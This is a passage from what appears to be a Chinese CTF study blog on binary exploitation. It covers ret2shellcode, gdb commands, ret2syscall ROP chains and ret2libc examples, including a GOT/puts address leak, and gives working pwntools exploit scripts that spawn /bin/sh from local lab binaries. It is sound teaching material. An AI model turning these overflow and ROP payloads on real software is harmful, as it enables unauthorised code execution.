src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515142803027.png" alt="image-20250515142803027"></p><p>此处vmmap只给我们提供了3类信息（可以根据颜色判断）：CODE、RODATA以及STACK。乍一看这题好像可以将shellcode注入至stack中，但绝大多数的操作系统都默认开启ASLR保护，这大大提高了攻击栈的难度。因此，栈应当是我们最后考虑的对象。</p><p>随后我们看到有个buf2的变量没有被定义，查看一下发现是个全局变量在bss段，地址为<code>0804A080</code>，再看一下vmmap的结果，0x804a000-0x804b000是一个可执行的段。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515143954449.png" alt="image-20250515143954449"></p><p>那我们的思路就很清晰了，就是将shellcode写入到buf2之后再填充垃圾数据覆盖栈，最后将栈返回地址指向buf2的起始地址即可。</p><p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250516094545297.png" alt="image-20250516094545297"></p><p>可以看到该字符串是通过相对于esp的索引，所以我们需要进行调试（至于为什么之前有些题目也是esp却可以直接查看Stack of main，我也不知道，只能之后做题的时候都尽量调试一下），将断点下在 call 处，查看 esp，ebp。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250516101708983.png" alt="image-20250516101708983"></p><p>可以看到这时候的s的地址为0xffffd53c，而ebp为0xffffd5a8，计算得到s相对于ebp的偏移为6c。构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br><br>buf2_addr=<span class="hljs-number">0x0804A080</span><br><br>padding=<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span><br><br>p1=shellcode.ljust(padding,<span class="hljs-string">b&#x27;a&#x27;</span>)+p32(buf2_addr)<br><br>r.sendline(p1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p><code>shellcraft.sh()</code>是pwntools 的<strong>Shellcraft 模块</strong>，它生成一个 <strong>spawn /bin/sh 的汇编模板</strong>。asm()函数会把 汇编模板编译成机器码bytes，也就是shellcode可以直接写入内存执行。</p><p>成功利用漏洞：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250518160853607.png" alt="image-20250518160853607"></p><h1 id="03-gdb">03 gdb</h1><p>这里我们再补充一下gdb的使用方法。</p><p>运行一般程序：<code>gdb 文件</code></p><h2 id="3-1-打断点">3.1 打断点</h2><p>断点是<code>break</code> 命令（可以用 <code>b</code> 代替）常用的语法格式有以下 2 种。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) break location             # 格式1： b location<br>(gdb) break ... if cond         # 格式2： b .. if cond<br></code></pre></td></tr></table></figure><h2 id="3-2-常见命令">3.2 常见命令</h2><p>断点调试过程中，常见的命令</p><table><thead><tr><th>命令（缩写）</th><th>功 能</th></tr></thead><tbody><tr><td>run（r）</td><td>启动或者重启一个程序。</td></tr><tr><td>list（l）</td><td>显示带有行号的源码。</td></tr><tr><td>continue（c）</td><td>让暂停的程序继续运行。</td></tr><tr><td>next（n）</td><td>单步调试程序，即手动控制代码一行一行地执行。</td></tr><tr><td>step（s）</td><td>如果有调用函数，进入调用的函数内部；否则，和 next 命令的功能一样。</td></tr><tr><td>until（u） until location（u location）</td><td>当你厌倦了在一个循环体内单步跟踪时，单纯使用 until 命令，可以运行程序直到退出循环体。 until n 命令中，n 为某一行代码的行号，该命令会使程序运行至第 n 行代码处停止。</td></tr><tr><td>finish（fi）</td><td>结束当前正在执行的函数，并在跳出函数后暂停程序的执行。</td></tr><tr><td>return（return）</td><td>结束当前调用函数并返回指定值，到上一层函数调用处停止程序执行。</td></tr><tr><td>jump（j）</td><td>使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码。</td></tr><tr><td>print（p）</td><td>打印指定变量的值。</td></tr><tr><td>quit（q）</td><td>退出 GDB 调试器。</td></tr></tbody></table><p>运行带libc库的程序：<code>gdb -q --args ./ld-linux-x86-64.so.2 --library-path . ./pwn</code></p><p>进入gdb后执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">允许断点在符号尚未加载时暂存</span><br>(gdb) set breakpoint pending on<br><span class="hljs-meta prompt_"># </span><span class="language-bash">让 gdb 自动加载共享库的符号</span><br>(gdb) set auto-solib-add on<br></code></pre></td></tr></table></figure><p>之后就可以正常运行了。</p><h1 id="04-ret2syscall">04 ret2syscall</h1><h2 id="4-1-补充系统调用知识">4.1 补充系统调用知识</h2><p>首先要知道一些系统调用的基础知识，不知道的建议先学学内核扩充一下知识库。随后需要知道执行命令的系统调用为<code>execve()</code>。32位系统中该系统调用的编号为0xb，调用号通过<strong>eax</strong>传递，其余参数传递为<strong>ebx</strong>，<strong>ecx</strong>，<strong>edx</strong>，<strong>esi</strong>，<strong>edi</strong>。</p><p>64位系统的系统调用号为0x3b，<strong>rax</strong>传递，其余参数传递为<strong>rdi</strong>，<strong>rsi</strong>，<strong>rdx</strong>，<strong>r10</strong>，<strong>r8</strong>，<strong>r9</strong>。</p><p>且ret返回的函数名不同</p><ul><li>32位为int 0x80，64位为syscall ret</li></ul><h2 id="4-2-题目分析">4.2 题目分析</h2><p>接下来看看这道题目，发现该程序开启栈不可执行。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514152820279.png" alt="image-20250514152820279"></p><p>进ida的程序主体看一下，发现没有现成的system函数，但是还是存在gets函数，说明存在栈溢出漏洞。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514153052485.png" alt="image-20250514153052485"></p><p>随后能注意到左侧一堆函数，感觉是用了静态链接库</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514153240100.png" alt="image-20250514153240100"></p><p>用file命令查一下，果然是静态链接的程序，这也就满足了使用系统调用的条件。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514153348275.png" alt="image-20250514153348275"></p><p>那这道题目就很明显了。随后补充一下知识点</p><h2 id="4-3-ROP是什么，ROPgadget使用">4.3 ROP是什么，ROPgadget使用</h2><blockquote><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p></blockquote><p>ret2syscall，即通过ROP控制程序执行系统调用，获取 shell。也就是通过一点一点的执行汇编代码拼接成我们想要执行的程序。所谓 gadgets 就是以 ret 结尾的指令序列。</p><ul><li>例如：pop eax ; ret</li></ul><p>这段代码的作用就是将栈顶的数据弹出给eax，然后再将栈顶的数据作为返回地址返回。</p><p>获取gadgets的方式：</p><ul><li><code>ROPgadget --binary 文件名 --only 'pop|ret' |grep '寄存器名'</code></li><li><code>ROPgadget --binary 文件名 --only 'int'</code></li><li><code>ROPgadget --binary 文件名 --string '/bin/sh'</code></li></ul><p>要使用系统调用，那就需要把系统调用号传入eax寄存器，然后需要把ecx和edx的寄存器给清空。最后就是需要去把参数/bin/sh的地址存入ebx寄存器。</p><h2 id="4-4-怎么把参数-bin-sh写入程序中？写到哪？">4.4 怎么把参数/bin/sh写入程序中？写到哪？</h2><h3 id="4-4-1-写到哪">4.4.1 写到哪</h3><p><strong>我们要尽可能写到bss段</strong>，因为在不开pie的情况下，<strong>bss段的地址是不会变的</strong>，这意味着，我们可以用IDA看一下bss段的地址然后选定一个我们写入参数的地址，然后我们exp就可以直接写上这个地址了。但是如果我们想写到栈里面，确实用gdb也可以看到写在了哪个内存单元里面，但是这个地址是会变的，把exp上写入我们刚才用gdb看到的地址。解决办法也有，那就是需要泄露程序的一个内存单元地址，然后利用偏移，来计算出我们存放/bin/sh参数的地址。但是这样多少有点麻烦，并且很多时候，我们是无法泄露程序中的地址的，因此我们选择写到bss段。</p><h3 id="4-4-2-怎么写？">4.4.2 怎么写？</h3><h4 id="第一种方法">第一种方法</h4><p><strong>第一种方法是去搜索gadget，寻找pop [ecx]这类对地址内容操作的指令</strong>。然后我们利用如下payload可以达到将参数/bin/sh写入bss段。（<em>并且这部分的payload需要放到返回地址处使用</em>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+<span class="hljs-string">&#x27;/bin&#x27;</span><br>payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="hljs-number">4</span>)+p32(pop_[ecx]_addr)+<span class="hljs-string">&#x27;/sh\x00&#x27;</span><br></code></pre></td></tr></table></figure><p>首先pop_ecx_addr指的是pop ecx;ret这个指令的地址 bss_addr指的将参数写入bss段的具体地址</p><p>pop_[ecx]_addr指的是pop dword ptr [ecx];ret这个指令的地址 (这里我写[ecx]是为了方便理解，我记得实际的exp里面，不能使用方括号）（另外这里不一定要是ecx，别的寄存器也可以，这里只是举个例子）然后参数/bin就是我们的参数</p><p><strong>至于这个bss_addr+4是上面bss_addr的地址的衔接，因为参数/bin/sh需要两个内存单元存放，因此在这里将上面的地址加4，就存到了下面的内存单元</strong>。最后的\x00是用来声明字符串的结束。</p><p><strong>但是这样搜寻gadget的手段，是有弊端的，因为有时候程序可能恰好就没有类似于pop [ecx]这样的指令。</strong></p><h4 id="第二种方法">第二种方法</h4><p>因此我们可以用第二种方法，等到可以溢出的时候，用rop，<strong>先去把返回地址处放置一个read函数，然后再把/bin/sh写入指定的地址（把该地址放在read函数第二个参数即可）然后再随便找一个连续三次pop的指令（不连续应该也是可以的，反正就要进行三次pop，将read函数的三个参数先从栈顶给弹出来）</strong><br>接着再进行ret2syscall，参数传完了，剩下的只要找些gadget片段进行ret2syscall即可。如果没有read函数的话，理论来说我们是可以系统调用read函数的，但是我试了一下，当用int 0x80来系统调用read函数之后，int 0x80指令的后面不是ret指令，没有办法再去衔接后面的gadget了。不过目前还没有遇见过系统调用read函数再ret2syscall的题目。</p><p>当使用这两种方法其中的一种之后，传参完毕，如此剩下的就是去搜寻我们需要的gadget片段，最后系统调用即可。</p><h2 id="4-5-思路">4.5 思路</h2><blockquote><p>因此这道题的思路很明确了，溢出之后填充pop eax所在地址，之后弹出<code>int 0x80</code>到eax中，在这之后弹出pop ebx所在地址，将<code>'/bin/sh'</code>弹出到ebx中。按照这个逻辑将ecx和edx都赋值为0</p></blockquote><p>接下来我们来找一下这些结构的地址，首先是pop eax;ret，这里第一个包含pop ebx，会打乱栈，选择第二个<code>0x080bb196</code>。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514212217965.png" alt="image-20250514212217965"></p><p>接下来找一下<code>/bin/sh</code>的地址，没有的话就只能自己构造一下。找到<code>'/bin/sh'</code>的地址为<code>0x080be408</code>。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514215139448.png" alt="image-20250514215139448"></p><p>接下来找一下pop ebx;ret，如图所示，意外发现箭头所指的地方正是我们想要赋值的所有剩余寄存器，那我们直接使用该地址<code>0x0806eb90</code>，将栈结构稍微修改一下即可。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514215438603.png" alt="image-20250514215438603"></p><p>接下来看看int 0x80所在地址，找到为<code>0x08049421</code>。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514215607789.png" alt="image-20250514215607789"></p><p>最后我们来看看需要填充多少才能溢出：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514215830198.png" alt="image-20250514215830198"></p><p>填充64h+4个字符可以覆盖返回地址。但是这里有坑，注意到栈中没有定义v4的起始位置，也就是说v4前面有多少数据入栈是需要调试的，并没有给出来。</p><p>使用pwngdb调试一下，gdb ret2syscall b main（在main函数下断点） r（让程序跑起来） n（单步执行） 一直走到gets函数输入字符串AAAAAAAA，看到栈结构，此时ebp为0xffffd5b8，输入的v4的地址为0xffffd54c，b8-4c=6c。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515110010964.png" alt="image-20250515110010964"></p><p>思路理清楚之后我们来想一下成功利用的栈长什么样：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+---------------------+</span><br><span class="hljs-section">| &#x27;A&#x27; * 0x70          | ← 填充</span><br><span class="hljs-section">+---------------------+</span><br><span class="hljs-section">| 0xdeadbeef          | ← 覆盖 EBP</span><br><span class="hljs-section">+---------------------+</span><br><span class="hljs-section">| pop_eax_ret         | ← 覆盖返回地址</span><br><span class="hljs-section">+---------------------+</span><br>| 0xb                 | ← ROP 参数<br></code></pre></td></tr></table></figure><p>该有的都有了我们就可以直接来写POC了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax=<span class="hljs-number">0x080bb196</span><br>execve=<span class="hljs-number">0xb</span><br>int_80=<span class="hljs-number">0x08049421</span><br>pop_edx_ecx_ebx=<span class="hljs-number">0x0806eb90</span><br>bin_sh=<span class="hljs-number">0x080be408</span><br><br><br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>)+p32(pop_eax)+p32(execve)+p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)+p32(int_80)<br><br>r.sendline(p1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>之后来试验一下，发现能成功利用漏洞，这个题目就结束啦。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515112820755.png" alt="image-20250515112820755"></p><h1 id="05-ret2libc">05 ret2libc</h1><h2 id="5-1-PLT表和GOT表">5.1 PLT表和GOT表</h2><p>在进行ret2libc学习之前，我们需要先了解一下PLT表与GOT表的内容。</p><p>Procedure linkage table（PLT)过程连接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量</p><p>Globle offset table（GOT)全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址。当程序首次调用某个外部函数时，实际上会跳转到PLT中的对应条目，而不是直接调用目标函数。</p><p>外部函数首次调用时，控制流会经过 PLT 表，PLT 中的代码片段首先尝试通过 GOT 跳转，但此时 GOT 中尚未存储真实函数地址，因此会回退到 PLT 中的解析逻辑。PLT 会压入函数在重定位表中的索引，并跳转到动态链接器，由动态链接器负责解析该函数的真实地址，将其回填到 GOT 中。如下图所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/msedge_JYwSoYktqg.png" alt=""></p><p>一旦地址被填充，后续所有对该函数的调用都会直接通过 GOT 跳转到目标函数，无需再次解析。如下图所示可以看到此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/msedge_ItT81O2Nmz.png" alt=""></p><h2 id="5-2-例1-ret2libc1">5.2 例1 ret2libc1</h2><p>我们还是首先查看一下一下文件开启的保护。发现开启了栈不可执行保护。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/2025-05-19113837.png" alt=""></p><p>接下来我们用ida反汇编后去main函数查看一下</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_q99lgGQMad.png" alt=""></p><p>发现有gets这个危险函数，存在栈溢出，接下来思考如何去利用。查看string字符串后发现&quot;/bin/sh&quot;，并得到其地址0x0804A03C，接下来寻找system函数即可。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_yhz7rjxhnw.png" alt=""></p><p>接下来找到外部函数system的调用，得到调用地址为0x08048460</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_z9lQUx1aoW.png" alt=""></p><p>那就很简单了，直接看一下需要制造多少垃圾数据填充即可。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_aRHFdSeeOY.png" alt=""></p><p>得出需要填充0xb8-0x4c+4个垃圾数据，需要注意的是构造的payload中system函数需要先压入return地址到栈中，随后才是system函数的参数压入栈。因此构造POC如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>system_addr=<span class="hljs-number">0x08048460</span><br><br>bin_sh=<span class="hljs-number">0x08048720</span><br><br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xb8</span>-<span class="hljs-number">0x4c</span>+<span class="hljs-number">4</span>)+p32(system_addr)+<span class="hljs-string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)<br><br>r.sendline(p1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>可以看到利用成功：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_xB7obxY3Hs.png" alt=""></p><p>这道题相对简单，同时提供了&quot;/bin/sh&quot;和system函数调用，但是大多数程序并不会有这么好的情况。</p><h2 id="5-3-例2-ret2libc2">5.3 例2 ret2libc2</h2><p>照例查看文件信息：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_yq764FmRcc.png" alt=""></p><p>有的人看到这部分跟ret2syscall那个很像，但是其实ret2syscall需要使用ROP构造系统调用，但是这道题中并没有相应的ROP，比如我们找一下pop eax;ret：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_SngC1QlvyC.png" alt=""></p><p>发现找不到，其实这也就意味着ret2syscall所需要的条件更苛刻，也就是题目更简单。我们来查看一下main函数：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_KROcn7WWCc.png" alt=""></p><p>同样的存在gets危险函数，存在栈溢出，但是这道题并没有提供&quot;/bin/sh&quot;：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_WEBntSf3Wq.png" alt=""></p><p>先看看查找一下system的地址，为0x08048490</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_mRSKCIQ6wA.png" alt=""></p><p>接下来就是解决&quot;/bin/sh&quot;字符串的问题了。这里由于&quot;/bin/sh&quot;需要作为一个参数传入system中，因此我们需要将&quot;/bin/sh&quot;注入到bss段中。我们这里先尝试这样解决，如果bss段没有全局变量再想其他办法，不过好在这题并不复杂，题目给出了buf2全局变量，地址为0x0804A080。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_z3m1KBqjA2.png" alt=""></p><p>我们需要调用gets函数，读取一个/bin/sh放在buf2，随后将buf2当作system的参数传入。先找到gets函数，我们去plt表看，gets地址为0x08048460。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ida_7DhuPY1MxY.png" alt="ida_7DhuPY1MxY"></p><p>调用gets函数时，会将gets函数的返回地址也压入栈中，随后被压入栈的是gets函数的参数。当gets函数执行的时候，会找到esp+8的位置也就是参数的位置，<strong>当我们想要弹出参数后面的system地址的时候，就需要将参数pop出来，然后ret就会弹出下一个地址并跳转执行</strong>。这时候我们就需要找到一个pop 寄存器;ret指令，将gets函数参数pop出来。</p><p>这里我们不是构造系统调用，所以随便一个pop ret即可：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_JBzY9baMHR.png" alt="MobaXterm_JBzY9baMHR"></p><p>这里因为ebp最好不要动，我们选第三个，地址为0x0804843d，这时候我们想想栈结构是怎么样的</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> 低地址                         </span>|<br>|<span class="hljs-string"> &#x27;a&#x27;*112 (覆盖到返回地址)         </span>|<span class="hljs-string"> ← 填充 ebp-0xb8 到 ebp+4</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> gets_addr (0x08048460)        </span>|<span class="hljs-string"> ← 覆盖原始返回地址</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> pop_ebx_ret (0x0804843d)      </span>|<span class="hljs-string"> ← gets返回后执行</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> buf2 (0x0804A080)             </span>|<span class="hljs-string"> ← gets的参数，被之后会被pop出来</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> system_addr (0x08048490)      </span>|<span class="hljs-string"> ← ret之后会将其弹出并执行</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> &#x27;bbbb&#x27; (伪返回地址)             </span>|<span class="hljs-string"> ← system的返回地址（无意义）</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> buf2 (0x0804A080)             </span>|<span class="hljs-string"> ← system的参数（/bin/sh地址）</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------------------</span>|<br>|<span class="hljs-string"> 高地址                         </span>|<br>|<span class="hljs-string">-------------------------------</span>|<br></code></pre></td></tr></table></figure><p>思路确定好后就是查看填充多少字符了</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/MobaXterm_K6AOQOwaKP.png" alt=""></p><p>填充量和上一题是一样的，写POC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br>pop_ebx_ret=<span class="hljs-number">0x0804843d</span><br><br>gets_addr=<span class="hljs-number">0x08048460</span><br><br>system_addr=<span class="hljs-number">0x08048490</span><br><br>buf2=<span class="hljs-number">0x0804A080</span><br><br>bin_sh=<span class="hljs-string">&quot;/bin/sh&quot;</span><br><br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xb8</span>-<span class="hljs-number">0x4c</span>+<span class="hljs-number">4</span>)+p32(gets_addr)+p32(pop_ebx_ret)+p32(buf2)+p32(system_addr)+<span class="hljs-string">b&#x27;bbbb&#x27;</span>+p32(buf2)<br><br>r.sendline(p1)<br>r.sendline(bin_sh)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>利用成功：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/pycharm64_Ll2Jtc5gkR.png" alt="pycharm64_Ll2Jtc5gkR"></p><h2 id="5-4-例3-ret2libc3">5.4 例3 ret2libc3</h2><p>还是照常查看一下开启的保护，发现开启了堆栈不可执行保护：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729173001215.png" alt="image-20250729173001215"></p><p>随后先逆向看一下函数的漏洞</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729173523627.png" alt="image-20250729173523627"></p><p>查看发现不存在&quot;/bin/sh&quot;，再查看函数发现也不存在system函数，那就只能自己找了。</p><p>一般来说，所有的系统调用都可以使用plt表查看到，而且特定版本的libc库中函数的位置都是固定的，只要泄露出其中一个函数的地址就可以知道system()函数的地址，从而能入侵目标。</p><p>而之前我们提到，一个函数被调用之后会在got表中保存其在内存中的地址，于是我们就有了通过泄露got表内存来泄露函数地址的想法。这里我们泄露一下puts函数的地址即可。</p><p>接下来梳理一下思路，首先为了泄露出函数地址，我们需要调用puts函数进行程序的输出，后面填充的四个自己需要时puts函数的返回地址，我们要求puts函数执行完成后再次返回main函数的起始位置，故这个位置应当填写main函数起始位置的地址，再往后的四个字节应当填写puts函数的参数，即任意一个已经执行过的函数，这里就可以填puts的got。因此payload如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = b<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-literal">off</span>set + puts_plt + addr_start + puts_got<br></code></pre></td></tr></table></figure><p>这时候写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>addr_main = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment"># 获取_start函数的地址</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<span class="hljs-comment"># got表中指向__libc_start_main的指针</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_main) + p32(puts_got)<br><br>r.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>,payload)<br><br><span class="hljs-comment">#从进程输出里接收数据，截取前 4 个字节，并把它们转成一个 32 位整数</span><br>put_addr = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr=&#x27;</span>+<span class="hljs-built_in">hex</span>(put_addr))<br></code></pre></td></tr></table></figure><p>这里的进程输出我们需要的是got表中指向的地址，32位操作系统中地址大小为4字节，为了防止获取到的输出内容中有其他类似于’\n’的符号，只需要取前4字节即可。查看输出可以发现两次输出不一样，这是因为开启了ASLR 保护，但是ASLR 保护也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250827163944409.png" alt="image-20250827163944409"></p><p>但是这里查阅<a href="https://libc.rip/">libc database search</a>发现有好几个可能的libc：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250827164038898.png" 